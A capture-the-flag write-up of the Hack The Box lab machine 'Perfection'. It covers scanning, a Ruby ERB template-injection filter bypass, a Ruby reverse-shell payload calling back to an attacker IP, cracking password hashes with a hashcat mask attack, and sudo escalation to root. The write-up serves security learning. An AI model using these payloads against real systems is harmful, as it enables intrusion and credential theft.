---
date: 2024-07-04T14:05:10-05:00
# description: ""
image: "/images/HTB-Perfection/Perfection.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Perfection"
type: "post"
---

* Platform: Hack The Box
* Link: [Perfection](https://app.hackthebox.com/machines/Perfection)
* Level: Easy
* OS: Linux
---

Perfection begins with a straightforward website. Through enumeration, we identify a vulnerability to Server-Side Template Injection (SSTI), which we exploit to gain an initial foothold. We then discover a database file containing password hashes, but our initial attempts to crack them are unsuccessful. After reading the user's emails, we learn that the passwords follow a specific format. Using this information, we employ a mask attack with Hashcat and successfully recover the password. This allows us to run `sudo -l` and discover that the sudo rules are highly permissive, enabling us to escalate our privileges without needing a password.

Target IP address - `10.10.11.253`

## Scanning

```
nmap -sC -sV -oA  nmap/Perfection 10.10.11.253
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-25 14:20 CDT
Nmap scan report for 10.10.11.253
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
```

## Enumeration

The website is a "a tool to calculate the total grade in a class based on category scores and percentage weights."

The `Calculate your weighted grade` page lets you use the tool.

![Calculate your weighted grade table](/images/HTB-Perfection/weighed-grade.png)

After filling the table and submitting the grades, we get some weighted grades.

![Weighted grades](/images/HTB-Perfection/weighed-grade-results.png)

In the footer we notice that the application is using `WEBrick 1.7.0`. 

![Website powered by WEBrick 1.7.0](/images/HTB-Perfection/WEBrick.png)

Searching for vulnerabilities related to this specific version is inconclusive. Attempting directory brute forcing, subdomain, and source code enumeration leads to the same outcome.

Using the `Wappalyzer` extension reveals that the application is using `Ruby 3.0.2`.

![Wapplyzer results](/images/HTB-Perfection/wappalyzer.png)

Since the application accepts user input we can try some injections attacks. Let's refill the table, capture the request with Burp Suite and send it to the repeater.

The first test is with `; ls` as the value for `category1`.

![Request in Burp for injection attack](/images/HTB-Perfection/injection-attack.png)

It returns `Malicious input blocked`. Trying various payloads create the same result, there is an input filter that we need to bypass.

![Injection blocked](/images/HTB-Perfection/injection-blocked.png)

On the `WEBrick` github page, we learn that it can handle different things. *Read more [here](https://github.com/ruby/webrick).*

![WEBrick github page](/images/HTB-Perfection/WEBrick-github.png)

We also learn that ERB is a templating system for Ruby. *Read more [here](https://github.com/ruby/erb).*

![ERB-template page](/images/HTB-Perfection/ERB-template.png)

Being unfamiliar with those technologies I ask ChatGPT how to check if a server is using the Ruby ERB templating system. We will use the third option.

![ERB tests](/images/HTB-Perfection/ERB-test.png)

## Initial Foothold

Trying the payload provided, I get the message: 

`Invalid query parameters: invalid %-encoding (&amp;lt;%= 2 + 2 %&amp;gt;)`.

After a few modifications the payload successfully works! The filter can be bypassed by using `%0A` (for a new line) and URL-encoding.

> Payload used for the test: `%0A<%25%3d+2+%2b+2+%25>`

![Successful SSTI test](/images/HTB-Perfection/SSTI-working.png)

This confirms that the target is vulnerable to [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) and is indeed using Ruby ERB. This means that we can execute a reverse shell and gain a foothold.

Below is the payload (ruby) used to get a reverse shell, it is from [revshells](https://www.revshells.com/).

**Full payload used for the reverse shell**

```
Chemistry%0A<%25%3d+`ruby+-rsocket+-e'spawn("sh",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new("10.10.15.4",1337))'`+%25>
```

![Ruby reverse shell](/images/HTB-Perfection/ruby-revshell.png)

We are able to access the system and are connected as the user `susan`. We upgrade the shell with the commands below.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

![Foothold](/images/HTB-Perfection/foothold.png)

The user flag is found in `/home/susan`.

![User flag location](/images/HTB-Perfection/user-flag.png)

## Privilege Escalation

We use `linpeas.sh` to find privilege escalation paths and find some useful information.

* `susan` is a sudoer

![User susan is a sudoer](/images/HTB-Perfection/susan-sudoer.png)

* credentials files are found

![Credentials files are found](/images/HTB-Perfection/susan-credentials.png)

* The user also has some mail, which might be worth checking out

![The user has some mail](/images/HTB-Perfection/susan-mail.png)


Running `sudo -l` requires a password.

![sudo -l requires password](/images/HTB-Perfection/susan-privesc.png)

The credentials file give us some users hashes including `susan`'s.

```
strings /home/susan/Migration/pupilpath_credentials.db
```

![susan hash](/images/HTB-Perfection/susan-hash.png)

```
hashid 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
```

Running `hashid` reveals that this is a SHA-256 hash. Using hashcat on the hash fails, it seems that it cannot be cracked yet.

After reading the mail we find the password structure.

![Reading susan mail](/images/HTB-Perfection/susan-mail1.png)

We try a mask attack and successfully recover the password `susan_nasus_413759210`.

> In a mask attack we know about the passwords designs. You can learn more about it [here](https://hashcat.net/wiki/doku.php?id=mask_attack#mask_attack).

```
hashcat -m 1400 hash.txt -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d
```

![Reading susan mail](/images/HTB-Perfection/password-recovered.png)

With that password we log in with SSH. Running `sudo -l` we see that we have a straight path to root.

![sudo -l command](/images/HTB-Perfection/sudo-l.png)

We have a very permissive rule allowing the user `susan` to run any command, as any user or group which effectively gives them full administrative control when using `sudo`. 

By running `sudo su` we get a root shell and find the root flag in `/root`.

![root flag](/images/HTB-Perfection/root-flag.png)

Thanks for reading my blog and I hope this write up was helpful to you!
